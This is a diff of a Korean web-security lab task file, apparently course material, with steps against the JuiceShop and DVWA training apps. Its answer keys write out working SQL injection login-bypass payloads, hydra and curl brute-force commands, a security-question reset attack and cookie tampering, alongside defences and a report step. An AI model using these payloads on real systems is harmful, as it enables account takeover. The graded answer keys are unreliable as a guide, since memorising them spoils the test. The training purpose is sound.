@@ -13,23 +13,35 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오. admin@juice-sh.op 계정에 패스워드 없이
-    로그인하라.
+  instruction: 'JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오. admin@juice-sh.op
+    계정에 패스워드 없이 로그인하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **SQLi 인증 우회**: `admin''--` 페이로드 / sqlmap --forms / **PayloadsAllTheThings/SQL
+    Injection/Intruder/Auth_Bypass.txt**
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: email 필드에 admin@juice-sh.op'-- 를 넣으면 WHERE 절의 패스워드 검증이 주석 처리됩니다.
   category: exploit
   points: 10
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST\
-    \ http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d\
-    \ '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"}'"
-  answer_detail: SQL Injection으로 인증 우회는 가장 대표적인 공격입니다. admin@juice-sh.op'-- 를 입력하면 SQL이 WHERE email='admin@juice-sh.op'--'
-    AND password='...' 가 되어 주석(--) 이후의 패스워드 조건이 무시됩니다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
+    \ -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
+    \ application/json' \\\n     -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
+    :\"anything\"}'"
+  answer_detail: SQL Injection으로 인증 우회는 가장 대표적인 공격입니다. admin@juice-sh.op'-- 를 입력하면
+    SQL이 WHERE email='admin@juice-sh.op'--' AND password='...' 가 되어 주석(--) 이후의 패스워드
+    조건이 무시됩니다.
   verify:
     type: output_contains
     expect: token
     field: stdout
     semantic:
-      intent: JuiceShop SQLi 인증 우회 — email=admin@juice-sh.op'-- + password 무관. -- 주석으로 패스워드 조건 무시. token
-        획득. OWASP A03 + CWE-89.
+      intent: JuiceShop SQLi 인증 우회 — email=admin@juice-sh.op'-- + password 무관. --
+        주석으로 패스워드 조건 무시. token 획득. OWASP A03 + CWE-89.
       success_criteria:
       - token 키워드
       - SQLi 페이로드 (admin'--)
@@ -44,22 +56,34 @@ steps:
       - 단순 로그인
   target_vm: attacker
 - order: 2
-  instruction: hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를 찾아라.
+  instruction: 'hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를
+    찾아라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **hydra brute force**: hydra http-post-form `email=^USER^&password=^PASS^:F=Invalid`
+    / wfuzz / **Burp Intruder Cluster Bomb** / patator
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: hydra -l admin -P 패스워드파일 http-post-form 형태를 사용하세요. 실패 메시지(Login failed)를 지정합니다.
   category: exploit
   points: 12
-  answer: echo -e 'password\nadmin\n123456\nletmein\ntest' > /tmp/dvwa_pass.txt && hydra -l admin -P /tmp/dvwa_pass.txt
-    10.20.30.80 -s 8080 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
-    -t 4 -f 2>/dev/null | tail -5
-  answer_detail: hydra는 네트워크 로그인 크래커로, HTTP 폼, SSH, FTP 등 다양한 프로토콜을 지원합니다. -l은 사용자명, -P는 패스워드 사전 파일, http-post-form은
-    폼 기반 인증을 공격합니다. -f는 첫 성공시 중단합니다.
+  answer: echo -e 'password\nadmin\n123456\nletmein\ntest' > /tmp/dvwa_pass.txt &&
+    hydra -l admin -P /tmp/dvwa_pass.txt 10.20.30.80 -s 8080 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login
+    failed' -t 4 -f 2>/dev/null | tail -5
+  answer_detail: hydra는 네트워크 로그인 크래커로, HTTP 폼, SSH, FTP 등 다양한 프로토콜을 지원합니다. -l은 사용자명,
+    -P는 패스워드 사전 파일, http-post-form은 폼 기반 인증을 공격합니다. -f는 첫 성공시 중단합니다.
   verify:
     type: output_regex
     expect: host|login|password|hydra
     field: stdout
     semantic:
-      intent: hydra 브루트포스 — hydra -l admin -P passwords.txt 10.20.30.80 -s 8080 http-post-form '/login.php:u=^USER^&p=^PASS^:Login
-        failed' -t 4 -f. DVWA Rate Limiting 없음. MITRE T1110.001.
+      intent: hydra 브루트포스 — hydra -l admin -P passwords.txt 10.20.30.80 -s 8080 http-post-form
+        '/login.php:u=^USER^&p=^PASS^:Login failed' -t 4 -f. DVWA Rate Limiting 없음.
+        MITRE T1110.001.
       success_criteria:
       - host/login/password/hydra 중 하나
       - hydra http-post-form
@@ -74,23 +98,35 @@ steps:
       - 실패 메시지 미지정
   target_vm: attacker
 - order: 3
-  instruction: DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행하시오. 일반적인 패스워드를 시도하여 정답을 찾아라.
-  hint: curl에 username=admin&password=X&Login=Login 형태로 GET 요청하세요. 'Welcome'이 응답에 포함되면 성공입니다.
+  instruction: 'DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행하시오. 일반적인 패스워드를 시도하여
+    정답을 찾아라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **curl 수동 brute**: bash for-loop / Python requests + threading / response code/length
+    차이
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: curl에 username=admin&password=X&Login=Login 형태로 GET 요청하세요. 'Welcome'이 응답에
+    포함되면 성공입니다.
   category: exploit
   points: 12
   answer: 'for pw in admin password 123456 letmein; do RESP=$(curl -s -b ''PHPSESSID=test;security=low''
-    "http://10.20.30.80:8080/vulnerabilities/brute/?username=admin&password=$pw&Login=Login" 2>/dev/null);
-    if echo "$RESP" | grep -q ''Welcome''; then echo "FOUND: password=$pw"; break; fi; echo "FAIL: $pw";
-    done'
-  answer_detail: 'Brute Force는 가능한 모든 비밀번호를 시도하는 공격입니다. DVWA low 레벨은 시도 횟수 제한이 없어 빠르게 성공합니다. 방어: 계정 잠금(5회
-    실패 시), CAPTCHA, Rate Limiting, MFA.'
+    "http://10.20.30.80:8080/vulnerabilities/brute/?username=admin&password=$pw&Login=Login"
+    2>/dev/null); if echo "$RESP" | grep -q ''Welcome''; then echo "FOUND: password=$pw";
+    break; fi; echo "FAIL: $pw"; done'
+  answer_detail: 'Brute Force는 가능한 모든 비밀번호를 시도하는 공격입니다. DVWA low 레벨은 시도 횟수 제한이 없어
+    빠르게 성공합니다. 방어: 계정 잠금(5회 실패 시), CAPTCHA, Rate Limiting, MFA.'
   verify:
     type: output_regex
     expect: FOUND|FAIL
     field: stdout
     semantic:
-      intent: '수동 Brute Force — for pw in admin password 123456 letmein; curl + ''Welcome'' grep. DVWA
-        low 시도 횟수 제한 없음. 방어: 계정 잠금 + CAPTCHA + Rate Limiting + MFA. CWE-307.'
+      intent: '수동 Brute Force — for pw in admin password 123456 letmein; curl + ''Welcome''
+        grep. DVWA low 시도 횟수 제한 없음. 방어: 계정 잠금 + CAPTCHA + Rate Limiting + MFA. CWE-307.'
       success_criteria:
       - FOUND 또는 FAIL 키워드
       - 다중 비번 시도 루프
@@ -105,25 +141,36 @@ steps:
       - 루프 부족
   target_vm: attacker
 - order: 4
-  instruction: DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를 확인하라.
+  instruction: 'DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를 확인하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **쿠키 보안 속성**: curl -I / DevTools Application / Burp Cookie / **HttpOnly/Secure/SameSite
+    표**
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: curl -I로 Set-Cookie 헤더를 확인하세요. 각 속성의 유무를 판단합니다.
   category: recon
   points: 10
-  answer: 'echo ''=== DVWA Session Cookie Analysis ==='' && COOKIE_HEADER=$(curl -sI -d ''username=admin&password=password&Login=Login''
-    http://10.20.30.80:8080/login.php | grep -i set-cookie) && echo "Raw: $COOKIE_HEADER" && echo $COOKIE_HEADER
-    | grep -qi httponly && echo ''HttpOnly: SET'' || echo ''HttpOnly: MISSING (XSS cookie theft possible)''
-    && echo $COOKIE_HEADER | grep -qi secure && echo ''Secure: SET'' || echo ''Secure: MISSING (cookie
-    sent over HTTP)'' && echo $COOKIE_HEADER | grep -qi samesite && echo ''SameSite: SET'' || echo ''SameSite:
-    MISSING (CSRF possible)'''
-  answer_detail: HttpOnly가 없으면 document.cookie로 세션을 탈취할 수 있고, Secure가 없으면 HTTP 평문으로 쿠키가 전송되어 스니핑 가능합니다.
-    SameSite가 없으면 크로스사이트 요청에 쿠키가 포함되어 CSRF 공격이 가능합니다.
+  answer: 'echo ''=== DVWA Session Cookie Analysis ==='' && COOKIE_HEADER=$(curl -sI
+    -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php
+    | grep -i set-cookie) && echo "Raw: $COOKIE_HEADER" && echo $COOKIE_HEADER | grep
+    -qi httponly && echo ''HttpOnly: SET'' || echo ''HttpOnly: MISSING (XSS cookie
+    theft possible)'' && echo $COOKIE_HEADER | grep -qi secure && echo ''Secure: SET''
+    || echo ''Secure: MISSING (cookie sent over HTTP)'' && echo $COOKIE_HEADER | grep
+    -qi samesite && echo ''SameSite: SET'' || echo ''SameSite: MISSING (CSRF possible)'''
+  answer_detail: HttpOnly가 없으면 document.cookie로 세션을 탈취할 수 있고, Secure가 없으면 HTTP 평문으로
+    쿠키가 전송되어 스니핑 가능합니다. SameSite가 없으면 크로스사이트 요청에 쿠키가 포함되어 CSRF 공격이 가능합니다.
   verify:
     type: output_contains
     expect: HttpOnly
     field: stdout
     semantic:
-      intent: 쿠키 보안 속성 — curl -sI + grep set-cookie + HttpOnly/Secure/SameSite 각각 검증. 부재 시 XSS 탈취/HTTP
-        평문/CSRF 위험. OWASP Session Management Cheatsheet.
+      intent: 쿠키 보안 속성 — curl -sI + grep set-cookie + HttpOnly/Secure/SameSite 각각
+        검증. 부재 시 XSS 탈취/HTTP 평문/CSRF 위험. OWASP Session Management Cheatsheet.
       success_criteria:
       - HttpOnly 키워드
       - 3종 속성 (HttpOnly/Secure/SameSite) 검증
@@ -138,25 +185,36 @@ steps:
       - 단순 GET
   target_vm: attacker
 - order: 5
-  instruction: 세션 고정(Session Fixation) 공격 가능성을 분석하시오. 로그인 전후에 세션 ID가 변경되는지 확인하라.
+  instruction: '세션 고정(Session Fixation) 공격 가능성을 분석하시오. 로그인 전후에 세션 ID가 변경되는지 확인하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **Session Fixation**: curl 4 단계 (획득→주입→로그인→재사용) / Burp Repeater / OWASP ZAP Session
+    Fixation rule
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: 먼저 인증 없이 세션 ID를 획득하고, 그 세션 ID로 로그인한 후에도 같은 세션 ID가 유지되는지 비교하세요.
   category: exploit
   points: 12
   answer: 'echo ''=== Session Fixation Test ==='' && PRE_SESSION=$(curl -sI http://10.20.30.80:8080/login.php
-    | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "Before login: $PRE_SESSION" && POST_SESSION=$(curl
-    -sI -b "$PRE_SESSION" -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php
-    | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "After login: $POST_SESSION" && if
-    [ "$PRE_SESSION" = "$POST_SESSION" ] || [ -z "$POST_SESSION" ]; then echo ''VULNERABLE: Session ID
-    NOT regenerated''; else echo ''SAFE: Session ID regenerated''; fi'
-  answer_detail: 세션 고정 공격은 공격자가 미리 생성한 세션 ID를 피해자에게 강제 사용시킨 후, 피해자가 로그인하면 공격자가 같은 세션으로 인증된 상태를 공유하는 공격입니다.
-    로그인 시 반드시 session_regenerate_id()로 세션 ID를 재생성해야 합니다.
+    | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "Before login:
+    $PRE_SESSION" && POST_SESSION=$(curl -sI -b "$PRE_SESSION" -d ''username=admin&password=password&Login=Login''
+    http://10.20.30.80:8080/login.php | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'')
+    && echo "After login: $POST_SESSION" && if [ "$PRE_SESSION" = "$POST_SESSION"
+    ] || [ -z "$POST_SESSION" ]; then echo ''VULNERABLE: Session ID NOT regenerated'';
+    else echo ''SAFE: Session ID regenerated''; fi'
+  answer_detail: 세션 고정 공격은 공격자가 미리 생성한 세션 ID를 피해자에게 강제 사용시킨 후, 피해자가 로그인하면 공격자가 같은
+    세션으로 인증된 상태를 공유하는 공격입니다. 로그인 시 반드시 session_regenerate_id()로 세션 ID를 재생성해야 합니다.
   verify:
     type: output_contains
     expect: Session Fixation Test
     field: stdout
     semantic:
-      intent: 세션 고정 테스트 — 로그인 전 PRE_SESSION 획득 + -b 쿠키로 로그인 → POST_SESSION 비교. 동일 = 재생성 안됨 (취약). session_regenerate_id()
-        필수. CWE-384.
+      intent: 세션 고정 테스트 — 로그인 전 PRE_SESSION 획득 + -b 쿠키로 로그인 → POST_SESSION 비교. 동일
+        = 재생성 안됨 (취약). session_regenerate_id() 필수. CWE-384.
       success_criteria:
       - Session Fixation Test 키워드
       - 로그인 전/후 세션 비교
@@ -171,27 +229,42 @@ steps:
       - 재생성 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: 패스워드 재설정 기능의 취약점을 분석하시오. JuiceShop의 보안 질문 목록을 확인하고, admin 계정의 보안 질문 답변을 추측하여 패스워드를 변경하라.
-  hint: GET /api/SecurityQuestions/ 로 보안 질문 목록을 확인한 후, POST /rest/user/reset-password에 다양한 답변을 시도하세요.
+  instruction: '패스워드 재설정 기능의 취약점을 분석하시오. JuiceShop의 보안 질문 목록을 확인하고, admin 계정의 보안 질문
+    답변을 추측하여 패스워드를 변경하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **Password Reset**: curl reset endpoint / **8 패턴** (timestamp/sequential/manipulation)
+    / **Host header injection** / sqlmap reset
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: GET /api/SecurityQuestions/ 로 보안 질문 목록을 확인한 후, POST /rest/user/reset-password에
+    다양한 답변을 시도하세요.
   category: exploit
   points: 12
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
     📎 참고 (CLI): echo ''=== Security Questions ==='' && curl -s http://10.20.30.80:3000/api/SecurityQuestions/
-    | python3 -c "import sys,json; [print(f''{q[\"id\"]}: {q[\"question\"]}'') for q in json.load(sys.stdin).get(''data'',[])]"
-    2>/dev/null && echo ''=== Password Reset Attempts ==='' && for ANS in ''Samuel'' ''Mr. N. Flansen''
-    ''West-2'' ''Snook''; do echo -n "Answer ''$ANS'': " && curl -s -o /dev/null -w ''%{http_code}'' -X
-    POST http://10.20.30.80:3000/rest/user/reset-password -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ANS\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
+    | python3 -c "import sys,json; [print(f''{q[\"id\"]}: {q[\"question\"]}'') for
+    q in json.load(sys.stdin).get(''data'',[])]" 2>/dev/null && echo ''=== Password
+    Reset Attempts ==='' && for ANS in ''Samuel'' ''Mr. N. Flansen'' ''West-2'' ''Snook'';
+    do echo -n "Answer ''$ANS'': " && curl -s -o /dev/null -w ''%{http_code}'' -X
+    POST http://10.20.30.80:3000/rest/user/reset-password -H ''Content-Type: application/json''
+    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ANS\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
     && echo ''''; done'
-  answer_detail: 보안 질문은 약한 인증 수단입니다. 답변이 추측 가능하거나 소셜 미디어에서 수집 가능합니다. Rate Limiting 없이 무한 시도가 가능하면 브루트포스로
-    답변을 찾을 수 있습니다. 200 응답이 오면 패스워드가 변경된 것입니다.
+  answer_detail: 보안 질문은 약한 인증 수단입니다. 답변이 추측 가능하거나 소셜 미디어에서 수집 가능합니다. Rate Limiting
+    없이 무한 시도가 가능하면 브루트포스로 답변을 찾을 수 있습니다. 200 응답이 오면 패스워드가 변경된 것입니다.
   verify:
     type: output_contains
     expect: Security Questions
     field: stdout
     semantic:
-      intent: '보안 질문 재설정 — GET /api/SecurityQuestions + POST /rest/user/reset-password 답변 추측. JuiceShop
-        보안 질문 답변 브루트포스. Rate Limit 없음 → 추측 공격. 방어: MFA 필수 + 보안 질문 폐기. CWE-287.'
+      intent: '보안 질문 재설정 — GET /api/SecurityQuestions + POST /rest/user/reset-password
+        답변 추측. JuiceShop 보안 질문 답변 브루트포스. Rate Limit 없음 → 추측 공격. 방어: MFA 필수 + 보안 질문
+        폐기. CWE-287.'
       success_criteria:
       - Security Questions 키워드
       - 질문 조회 + 답변 시도
@@ -206,23 +279,34 @@ steps:
       - MFA 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: 쿠키 변조를 통한 권한 상승을 시도하시오. DVWA의 security 쿠키를 변조하여 보안 레벨을 낮추고, SQL Injection을 수행하라.
+  instruction: '쿠키 변조를 통한 권한 상승을 시도하시오. DVWA의 security 쿠키를 변조하여 보안 레벨을 낮추고, SQL Injection을
+    수행하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **쿠키 변조 권한 상승**: curl -b 변조 / **Burp Repeater + Match and Replace** / DevTools
+    Cookie 편집 / **EditThisCookie** 확장
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: curl -b 'PHPSESSID=세션값;security=low'로 쿠키를 변조하여 /vulnerabilities/sqli/에 접근하세요.
   category: exploit
   points: 10
-  answer: "curl -s -c /tmp/dvwa_auth13.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
-    \ -L > /dev/null && echo '=== Low Level SQLi ===' && curl -s -b /tmp/dvwa_auth13.txt -b 'security=low'\
-    \ \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit\" \\\n | grep -o 'First\
-    \ name:[^<]*' | head -3"
-  answer_detail: 보안 레벨을 클라이언트 쿠키로 관리하는 것은 근본적인 설계 결함입니다. 쿠키는 클라이언트가 자유롭게 변조할 수 있으므로, 보안 설정은 반드시 서버 측 세션에
-    저장하고 서버에서만 검증해야 합니다.
+  answer: "curl -s -c /tmp/dvwa_auth13.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Low Level SQLi\
+    \ ===' && curl -s -b /tmp/dvwa_auth13.txt -b 'security=low' \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit\"\
+    \ \\\n | grep -o 'First name:[^<]*' | head -3"
+  answer_detail: 보안 레벨을 클라이언트 쿠키로 관리하는 것은 근본적인 설계 결함입니다. 쿠키는 클라이언트가 자유롭게 변조할 수 있으므로,
+    보안 설정은 반드시 서버 측 세션에 저장하고 서버에서만 검증해야 합니다.
   verify:
     type: output_contains
     expect: First name
     field: stdout
     semantic:
-      intent: 쿠키 변조 권한 상승 — curl -b 'PHPSESSID=x;security=low' /vulnerabilities/sqli/. 클라이언트 보안 레벨 쿠키
-        변조 = 설계 결함. 서버 측 세션에서만 관리. CWE-472.
+      intent: 쿠키 변조 권한 상승 — curl -b 'PHPSESSID=x;security=low' /vulnerabilities/sqli/.
+        클라이언트 보안 레벨 쿠키 변조 = 설계 결함. 서버 측 세션에서만 관리. CWE-472.
       success_criteria:
       - First name 키워드
       - security=low 쿠키 + SQLi
@@ -237,28 +321,39 @@ steps:
       - 단순 SQLi
   target_vm: attacker
 - order: 8
-  instruction: JuiceShop의 /rest/user/whoami 엔드포인트로 인증 상태를 확인하시오. 토큰 없이, 유효한 토큰으로, 만료/변조된 토큰으로 각각 접근하여
-    응답을 비교하라.
+  instruction: 'JuiceShop의 /rest/user/whoami 엔드포인트로 인증 상태를 확인하시오. 토큰 없이, 유효한 토큰으로,
+    만료/변조된 토큰으로 각각 접근하여 응답을 비교하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **인증 상태 검증**: curl /api/whoami / Burp Repeater / 토큰 유효성 체크 / `pyjwt` decode
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: '세 가지 경우를 순차적으로 테스트하세요: 토큰 없음, 유효한 토큰, 변조된 토큰.'
   category: defense
   points: 8
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== No Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami | head -c
-    200 && echo '''' && echo ''=== Valid Token ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
-    -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
-    | cut -d''"'' -f4) && curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN"
-    | head -c 200 && echo '''' && echo ''=== Tampered Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami
-    -H ''Authorization: Bearer INVALID.TOKEN.HERE'' | head -c 200'
-  answer_detail: 인증되지 않은 요청에는 401 Unauthorized와 최소한의 에러 메시지만 반환해야 합니다. 변조된 토큰에도 같은 응답이 나와야 합니다. 에러 메시지가
-    너무 구체적이면(유효하지 않은 서명 vs 만료된 토큰) 공격자에게 힌트를 제공합니다.
+    📎 참고 (CLI): echo ''=== No Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami
+    | head -c 200 && echo '''' && echo ''=== Valid Token ==='' && TOKEN=$(curl -s
+    -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' |
+    cut -d''"'' -f4) && curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization:
+    Bearer $TOKEN" | head -c 200 && echo '''' && echo ''=== Tampered Token ==='' &&
+    curl -s http://10.20.30.80:3000/rest/user/whoami -H ''Authorization: Bearer INVALID.TOKEN.HERE''
+    | head -c 200'
+  answer_detail: 인증되지 않은 요청에는 401 Unauthorized와 최소한의 에러 메시지만 반환해야 합니다. 변조된 토큰에도 같은
+    응답이 나와야 합니다. 에러 메시지가 너무 구체적이면(유효하지 않은 서명 vs 만료된 토큰) 공격자에게 힌트를 제공합니다.
   verify:
     type: output_contains
     expect: Valid Token
     field: stdout
     semantic:
-      intent: /rest/user/whoami 3가지 케이스 — 토큰 없음 + 유효 토큰 + 변조 토큰. 401 균일 응답 = 안전 / 구체 에러 = 정보 누출 (유효 vs
-        만료 구분). CWE-209.
+      intent: /rest/user/whoami 3가지 케이스 — 토큰 없음 + 유효 토큰 + 변조 토큰. 401 균일 응답 = 안전 /
+        구체 에러 = 정보 누출 (유효 vs 만료 구분). CWE-209.
       success_criteria:
       - Valid Token 키워드
       - 3케이스 (없음/유효/변조)
@@ -273,26 +368,39 @@ steps:
       - 에러 메시지 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: 인증/세션 보안 종합 평가를 수행하시오. 발견된 취약점을 정리하고, 각 취약점에 대한 구체적인 방어 방안을 작성하라.
+  instruction: '인증/세션 보안 종합 평가를 수행하시오. 발견된 취약점을 정리하고, 각 취약점에 대한 구체적인 방어 방안을 작성하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **보고서**: 약점 카탈로그 / **Burp Sequencer FIPS 140-2** / NIST SP 800-63B / DefectDojo
+    / sha256
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: SQL Injection 인증 우회, 브루트포스, 세션 고정, 쿠키 보안 속성 부재, 보안 질문 약점 등을 포함하세요.
   category: reporting
   points: 12
-  answer: "cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 종합 보고서 ===\n대상: JuiceShop + DVWA (10.20.30.80)\n\
-    \n[CRITICAL]\n1. SQL Injection 인증 우회 (JuiceShop)\n   방어: Prepared Statement, ORM 사용\n\n[HIGH]\n2.\
-    \ 브루트포스 Rate Limiting 부재\n   방어: 5회 실패시 30초 잠금 + CAPTCHA\n3. 세션 고정(Session Fixation) 취약\n   방어: 로그인시\
-    \ session_regenerate_id()\n4. 보안 질문 추측 가능\n   방어: MFA 도입, 보안 질문 폐기\n\n[MEDIUM]\n5. 쿠키 보안 속성 미설정\n\
-    \   방어: HttpOnly, Secure, SameSite=Strict\n6. 쿠키 기반 보안 레벨 관리\n   방어: 서버 측 세션에서만 관리\n\n[종합 권고]\n- bcrypt/argon2\
-    \ 패스워드 해싱\n- JWT 서버측 알고리즘 고정 + 강력한 서명키\n- MFA(TOTP/WebAuthn) 도입\nEOF\ncat /tmp/auth_report.txt"
-  answer_detail: '인증/세션 관리는 웹 보안의 핵심입니다. OWASP Top 10 2021의 A07(Identification and Authentication Failures)에
-    해당합니다. 방어의 핵심은 다층 방어: 입력 검증 + 안전한 해싱 + MFA + 세션 관리 + Rate Limiting입니다.'
+  answer: "cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 종합 보고서 ===\n대상: JuiceShop\
+    \ + DVWA (10.20.30.80)\n\n[CRITICAL]\n1. SQL Injection 인증 우회 (JuiceShop)\n   방어:\
+    \ Prepared Statement, ORM 사용\n\n[HIGH]\n2. 브루트포스 Rate Limiting 부재\n   방어: 5회 실패시\
+    \ 30초 잠금 + CAPTCHA\n3. 세션 고정(Session Fixation) 취약\n   방어: 로그인시 session_regenerate_id()\n\
+    4. 보안 질문 추측 가능\n   방어: MFA 도입, 보안 질문 폐기\n\n[MEDIUM]\n5. 쿠키 보안 속성 미설정\n   방어: HttpOnly,\
+    \ Secure, SameSite=Strict\n6. 쿠키 기반 보안 레벨 관리\n   방어: 서버 측 세션에서만 관리\n\n[종합 권고]\n\
+    - bcrypt/argon2 패스워드 해싱\n- JWT 서버측 알고리즘 고정 + 강력한 서명키\n- MFA(TOTP/WebAuthn) 도입\n\
+    EOF\ncat /tmp/auth_report.txt"
+  answer_detail: '인증/세션 관리는 웹 보안의 핵심입니다. OWASP Top 10 2021의 A07(Identification and
+    Authentication Failures)에 해당합니다. 방어의 핵심은 다층 방어: 입력 검증 + 안전한 해싱 + MFA + 세션 관리 +
+    Rate Limiting입니다.'
   verify:
     type: output_contains
     expect: 인증/세션 관리 취약점 종합 보고서
     field: stdout
     semantic:
-      intent: 인증/세션 종합 보고서 — [Critical] SQLi 인증 우회 / [High] 브루트포스/세션 고정/보안 질문 / [Medium] 쿠키 속성/쿠키 기반 보안
-        레벨 + 방어(Prepared Statement/Rate Limit/session_regenerate_id/MFA/HttpOnly). OWASP A07 + Session
-        Management Cheatsheet.
+      intent: 인증/세션 종합 보고서 — [Critical] SQLi 인증 우회 / [High] 브루트포스/세션 고정/보안 질문 / [Medium]
+        쿠키 속성/쿠키 기반 보안 레벨 + 방어(Prepared Statement/Rate Limit/session_regenerate_id/MFA/HttpOnly).
+        OWASP A07 + Session Management Cheatsheet.
       success_criteria:
       - 인증/세션 관리 취약점 종합 보고서 키워드
       - Critical/High/Medium 분류
@@ -307,54 +415,38 @@ steps:
       - MFA 누락
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "자동 vs 수동 점검 비교 — nikto + hydra + 오탐 필터링"
+  instruction: "[복합 시나리오] \"자동 vs 수동 점검 비교 — nikto + hydra + 오탐 필터링\"\n\n## 상황 (w12\
+    \ → w13 시나리오 연속)\n\n> 선배: \"자동화 도구 주차. nikto·ZAP·hydra 자동 스캐너는 빠르지만 *오탐 천지*.\n\
+    ※ 자동 후 수동 검증으로 거르는 게 핵심. 매트릭스 + 오탐 가이드.\"\n\n학습 목표 (lecture 자동화 + 한계 + 오탐 필터)\
+    \ + (lab #2 hydra + #3 수동 브루트포스) 통합.\n\n## 임무 (3 단계, 약 35분)\n\nNon-AI 트랙: ssh\
+    \ ccc@10.20.30.201 (attacker VM) 직접 실행.\n\n### Phase A — nikto 자동 스캔\n`nikto -h\
+    \ http://10.20.30.80 -maxtime 60 -nointeractive 2>&1 | head -40`\n발견 라인 + 오탐 가능\
+    \ 항목 (Allowed Methods, Server header) 명시.\n\n### Phase B — hydra 자동 + curl 수동\
+    \ 비교\n1) hydra:\n   `echo -e \"admin\\nadministrator\\nroot\\nuser\" > /tmp/users.txt`\n\
+    \   `echo -e \"password\\nadmin\\n123456\\nadmin123\\npassword123\" > /tmp/pwds.txt`\n\
+    \   `timeout 30 hydra -L /tmp/users.txt -P /tmp/pwds.txt 10.20.30.80 http-post-form\n\
+    \    \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\"\
+    \ -t 4 2>&1 | tail -10`\n2) curl 수동:\n   `for pw in password admin 123456 admin123;\
+    \ do\n     echo -n \"$pw: \"; curl -s -o /dev/null -w \"%{http_code} %{size_download}\\\
+    n\"\n     -X POST -d \"username=admin&password=$pw\" http://10.20.30.80/dvwa/login.php;\
+    \ done`\n\n### Phase C — 자동 vs 수동 매트릭스 + 오탐 가이드\n| 측면 | 자동 (nikto/ZAP) | 수동 (curl/Burp)\
